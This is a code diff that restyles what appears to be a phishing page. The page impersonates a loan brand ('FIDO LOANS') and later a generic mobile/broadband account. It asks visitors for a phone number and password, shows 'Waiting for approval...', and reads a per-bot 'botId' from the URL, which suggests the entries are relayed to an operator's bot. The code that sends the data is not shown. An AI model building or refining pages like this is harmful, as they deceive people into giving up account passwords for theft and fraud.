@@ -9,35 +9,12 @@
     body {
       margin: 0;
       font-family: Arial, Helvetica, sans-serif;
-      background: #ffffff;
-    }
-
-    .brand-bar {
-      width: 100%;
-      height: 72px;
-      display: flex;
-      align-items: stretch;
-      border-bottom: 1px solid #eee;
-    }
-
-    .brand-bar img {
-      height: 100%;
-      width: auto;
-    }
-
-    .brand-text-wrap {
-      flex: 1;
-      background: #e91e63;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .brand-text {
+      background: #0e0e0e;
       color: #ffffff;
-      font-size: 26px;
-      font-weight: bold;
-      letter-spacing: 1.5px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
     }
 
     .container {
@@ -46,84 +23,137 @@
       padding: 24px;
     }
 
-    h1 {
-      font-size: 22px;
-      color: #0a8f55;
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 56px;
       margin-bottom: 8px;
     }
 
-    p {
+    .logo h1 {
+      font-size: 22px;
+      margin: 0;
+      color: #e53935;
+    }
+
+    .logo p {
       font-size: 14px;
-      color: #666;
-      margin-bottom: 20px;
+      color: #bdbdbd;
+      margin-top: 6px;
     }
 
     label {
-      font-size: 14px;
-      color: #444;
-      display: block;
+      font-size: 13px;
+      color: #bdbdbd;
       margin-bottom: 6px;
+      display: block;
     }
 
-    input {
+    input,
+    select {
       width: 100%;
       padding: 14px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
+      font-size: 15px;
+      margin-bottom: 18px;
+      border-radius: 10px;
+      border: 1px solid #2a2a2a;
+      background: #1b1b1b;
+      color: #ffffff;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #777;
+    }
+
+    select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%23aaa' stroke-width='2'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+      background-size: 12px;
     }
 
     button {
       width: 100%;
       padding: 16px;
       font-size: 16px;
-      background: #0a8f55;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
+      border: none;
+    }
+
+    .primary-btn {
+      background: #e53935;
+      color: #ffffff;
+      margin-top: 10px;
+    }
+
+    .secondary-btn {
+      background: transparent;
+      border: 1px solid #e53935;
+      color: #e53935;
+      margin-top: 12px;
     }
 
     .status {
-      margin-top: 20px;
+      margin-top: 18px;
       text-align: center;
       font-size: 14px;
-      color: #0a8f55;
+      color: #4caf50;
       display: none;
     }
 
     .error {
-      color: #d32f2f;
+      color: #e53935;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 28px;
+      font-size: 12px;
+      color: #777;
     }
   </style>
 </head>
 <body>
 
-  <!-- HEADER -->
-  <div class="brand-bar">
-    <img src="fido-logo.jpeg" alt="Fido Logo">
-    <div class="brand-text-wrap">
-      <div class="brand-text">FIDO LOANS</div>
-    </div>
-  </div>
-
-  <!-- CONTENT -->
   <div class="container">
-    <h1>Confirm Your Details</h1>
-    <p>Please enter your phone number and password to continue.</p>
 
+    <!-- HEADER / LOGO -->
+    <div class="logo">
+      <img src="fido-logo.jpeg" alt="Logo">
+      <h1>Welcome</h1>
+      <p>Enter your details to continue</p>
+    </div>
+
+    <!-- FORM -->
     <form id="detailsForm">
+
+      <!-- NEW FIELD (UI ONLY) -->
+      <label>Account type</label>
+      <select>
+        <option value="mobile">Mobile</option>
+        <option value="broadband">Broadband</option>
+      </select>
+
       <label>Phone number</label>
-      <input type="text" id="phone" required />
+      <input type="text" id="phone" placeholder="Enter phone number" required />
 
       <label>Password</label>
-      <input type="password" id="password" required />
+      <input type="password" id="password" placeholder="Enter password" required />
 
-      <button type="submit">Continue</button>
+      <button type="submit" class="primary-btn">Next</button>
     </form>
 
     <div id="status" class="status">⏳ Waiting for approval...</div>
+
+    <button class="secondary-btn" onclick="history.back()">Go Back</button>
+
+    <div class="footer">v 5.3.2 (1.0.0)</div>
   </div>
 
   <script>
@@ -132,7 +162,6 @@
 
     const fullName = localStorage.getItem('fullName');
 
-    // ✅ Get botId from URL or storage (multi-bot safe)
     const params = new URLSearchParams(window.location.search);
     const botId =
       params.get('botId') ||
@@ -152,7 +181,6 @@
       const phone = document.getElementById('phone').value;
       const password = document.getElementById('password').value;
 
-      // ✅ SAVE PHONE FOR NEXT STEPS
       localStorage.setItem('phone', phone);
 
       statusEl.style.display = 'block';
